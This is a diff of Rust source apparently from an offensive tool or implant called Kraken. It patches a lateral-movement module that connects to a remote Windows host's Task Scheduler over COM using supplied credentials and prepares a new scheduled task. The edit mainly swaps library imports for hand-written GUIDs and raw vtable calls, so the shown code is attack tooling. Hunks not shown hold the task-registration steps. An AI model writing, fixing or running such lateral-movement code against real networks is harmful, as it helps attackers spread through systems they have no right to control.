@@ -36,8 +36,20 @@ fn execute_impl(task: &LateralSchtask) -> Result<LateralResult, KrakenError> {
     use windows_sys::Win32::System::Com::{
         CoCreateInstance, CoInitializeEx, CLSCTX_INPROC_SERVER, COINIT_MULTITHREADED,
     };
-    use windows_sys::Win32::System::TaskScheduler::{
-        ITaskService, CLSID_TaskScheduler, IID_ITaskService,
+
+    // CLSID_TaskScheduler = {0F87369F-A4E5-4CFC-BD3E-73E6154572DD}
+    let clsid_task_scheduler = windows_sys::core::GUID {
+        data1: 0x0F87369F,
+        data2: 0xA4E5,
+        data3: 0x4CFC,
+        data4: [0xBD, 0x3E, 0x73, 0xE6, 0x15, 0x45, 0x72, 0xDD],
+    };
+    // IID_ITaskService = {2FABA4C7-4DA9-4013-9697-20CC3FD40F85}
+    let iid_itask_service = windows_sys::core::GUID {
+        data1: 0x2FABA4C7,
+        data2: 0x4DA9,
+        data3: 0x4013,
+        data4: [0x96, 0x97, 0x20, 0xCC, 0x3F, 0xD4, 0x0F, 0x85],
     };
 
     fn wide(s: &str) -> Vec<u16> {
@@ -45,14 +57,14 @@ fn execute_impl(task: &LateralSchtask) -> Result<LateralResult, KrakenError> {
     }
 
     unsafe {
-        CoInitializeEx(std::ptr::null(), COINIT_MULTITHREADED);
+        CoInitializeEx(std::ptr::null(), COINIT_MULTITHREADED as u32);
 
-        let mut task_service: *mut ITaskService = std::ptr::null_mut();
+        let mut task_service: *mut std::ffi::c_void = std::ptr::null_mut();
         let hr = CoCreateInstance(
-            &CLSID_TaskScheduler,
+            &clsid_task_scheduler,
             std::ptr::null_mut(),
             CLSCTX_INPROC_SERVER,
-            &IID_ITaskService,
+            &iid_itask_service,
             &mut task_service as *mut _ as *mut *mut std::ffi::c_void,
         );
 
@@ -66,6 +78,7 @@ fn execute_impl(task: &LateralSchtask) -> Result<LateralResult, KrakenError> {
         // ITaskService::Connect(serverName, user, domain, password)
         // VARIANT wrapping a BSTR for the server name
         #[repr(C)]
+        #[derive(Copy, Clone)]
         struct Variant {
             vt: u16,
             pad1: u16,
@@ -94,7 +107,7 @@ fn execute_impl(task: &LateralSchtask) -> Result<LateralResult, KrakenError> {
         // ITaskService vtable: [3]=Connect (after QI/AddRef/Release)
         let vtable = *(task_service as *mut *mut *mut usize);
         type ConnectFn = unsafe extern "system" fn(
-            *mut ITaskService,
+            *mut std::ffi::c_void,
             Variant,
             Variant,
             Variant,
@@ -112,7 +125,7 @@ fn execute_impl(task: &LateralSchtask) -> Result<LateralResult, KrakenError> {
         free_bstr(server_bstr);
 
         if hr < 0 {
-            let release: unsafe extern "system" fn(*mut ITaskService) -> u32 =
+            let release: unsafe extern "system" fn(*mut std::ffi::c_void) -> u32 =
                 std::mem::transmute(*vtable.add(2));
             release(task_service);
             return Err(KrakenError::Module(format!(
@@ -123,7 +136,7 @@ fn execute_impl(task: &LateralSchtask) -> Result<LateralResult, KrakenError> {
 
         // GetFolder("\\") -> ITaskFolder (vtable[4])
         type GetFolderFn = unsafe extern "system" fn(
-            *mut ITaskService,
+            *mut std::ffi::c_void,
             *mut u16, // path BSTR
             *mut *mut std::ffi::c_void,
         ) -> i32;
@@ -136,7 +149,7 @@ fn execute_impl(task: &LateralSchtask) -> Result<LateralResult, KrakenError> {
         free_bstr(root_bstr);
 
         if hr < 0 {
-            let release: unsafe extern "system" fn(*mut ITaskService) -> u32 =
+            let release: unsafe extern "system" fn(*mut std::ffi::c_void) -> u32 =
                 std::mem::transmute(*vtable.add(2));
             release(task_service);
             return Err(KrakenError::Module(format!(
@@ -147,7 +160,7 @@ fn execute_impl(task: &LateralSchtask) -> Result<LateralResult, KrakenError> {
 
         // NewTask -> ITaskDefinition (vtable[5])
         type NewTaskFn = unsafe extern "system" fn(
-            *mut ITaskService,
+            *mut std::ffi::c_void,
             u32,
             *mut *mut std::ffi::c_void,
         ) -> i32;
@@ -161,7 +174,7 @@ fn execute_impl(task: &LateralSchtask) -> Result<LateralResult, KrakenError> {
             let fld_release: unsafe extern "system" fn(*mut std::ffi::c_void) -> u32 =
                 std::mem::transmute(*fld_vtable.add(2));
             fld_release(folder);
-            let release: unsafe extern "system" fn(*mut ITaskService) -> u32 =
+            let release: unsafe extern "system" fn(*mut std::ffi::c_void) -> u32 =
                 std::mem::transmute(*vtable.add(2));
             release(task_service);
             return Err(KrakenError::Module(format!(
@@ -188,7 +201,7 @@ fn execute_impl(task: &LateralSchtask) -> Result<LateralResult, KrakenError> {
             let fld_release: unsafe extern "system" fn(*mut std::ffi::c_void) -> u32 =
                 std::mem::transmute(*fld_vtable.add(2));
             fld_release(folder);
-            let release: unsafe extern "system" fn(*mut ITaskService) -> u32 =
+            let release: unsafe extern "system" fn(*mut std::ffi::c_void) -> u32 =
                 std::mem::transmute(*vtable.add(2));
             release(task_service);
             return Err(KrakenError::Module(format!(
@@ -219,7 +232,7 @@ fn execute_impl(task: &LateralSchtask) -> Result<LateralResult, KrakenError> {
             let fld_release: unsafe extern "system" fn(*mut std::ffi::c_void) -> u32 =
                 std::mem::transmute(*fld_vtable.add(2));
             fld_release(folder);
-            let release: unsafe extern "system" fn(*mut ITaskService) -> u32 =
+            let release: unsafe extern "system" fn(*mut std::ffi::c_void) -> u32 =
                 std::mem::transmute(*vtable.add(2));
             release(task_service);
             return Err(KrakenError::Module(format!(
@@ -369,7 +382,7 @@ fn execute_impl(task: &LateralSchtask) -> Result<LateralResult, KrakenError> {
                 std::mem::transmute(*fld_vtable.add(2));
             fld_release(folder);
             // Release task_service
-            let release: unsafe extern "system" fn(*mut ITaskService) -> u32 =
+            let release: unsafe extern "system" fn(*mut std::ffi::c_void) -> u32 =
                 std::mem::transmute(*vtable.add(2));
             release(task_service);
             return Err(KrakenError::Module(format!(
@@ -425,7 +438,7 @@ fn execute_impl(task: &LateralSchtask) -> Result<LateralResult, KrakenError> {
         fld_release(folder);
 
         // Release task_service
-        let release: unsafe extern "system" fn(*mut ITaskService) -> u32 =
+        let release: unsafe extern "system" fn(*mut std::ffi::c_void) -> u32 =
             std::mem::transmute(*vtable.add(2));
         release(task_service);
     }
